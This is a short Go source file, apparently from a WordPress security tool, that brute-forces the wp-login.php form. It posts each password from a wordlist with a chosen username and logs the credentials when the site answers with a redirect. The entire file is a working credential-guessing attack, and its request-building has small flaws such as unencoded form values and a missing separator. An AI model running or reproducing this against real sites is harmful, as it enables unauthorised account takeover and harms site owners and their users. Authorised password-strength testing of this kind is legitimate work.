package bruteforce

import (
	"bufio"
	"net/http"
	"os"

	"github.com/institute-atri/glogger"
	"github.com/institute-atri/gnet"
)

// This function will perform a brute force attack on the WordPress site, providing the link and user
func Bruteforce(url, user string, pathToWordlist string) {
	glogger.Warning("Doing brute force attack...")
	var wordlistFile string
	
	if pathToWordlist == "" {
		wordlistFile = "../tools/bruteforce/wordlist.txt"
	} else {
		wordlistFile = pathToWordlist
	}
	
	urlLogin := url + "/wp-login.php"

	file, err := os.Open(wordlistFile)

	if err != nil {
		glogger.Danger("Error opening file:", err)
		return
	}

	defer file.Close()

	scanner := bufio.NewScanner(file)
	tryingPasswords(scanner, urlLogin, user)

	if err := scanner.Err(); err != nil {
		glogger.Danger("Error reading file:", err)
		return
	}
}

func tryingPasswords(scanner *bufio.Scanner, url, user string) {
	for scanner.Scan() {
		word := scanner.Text()

		r := gnet.NewHttp()

		r.SetURL(url)
		r.SetMethod("POST")
		r.SetData("log=" + user + "&pwd=" + word + "&wp-submit=Acessar&redirect_to=" + url + "testcookie=1")
		r.SetContentType("application/x-www-form-urlencoded")

		found := false

		r.SetRedirectFunc(func(req *http.Request, via []*http.Request) error {
			if req.Response.StatusCode == 302 {
				glogger.Done("login:\n username:" + user + "\n password:" + word)
				found = true
			}

			return nil
		})
		_, err := r.Do()

		if err != nil {
			println(err)
		}

		if found {
			break
		}
	}
}
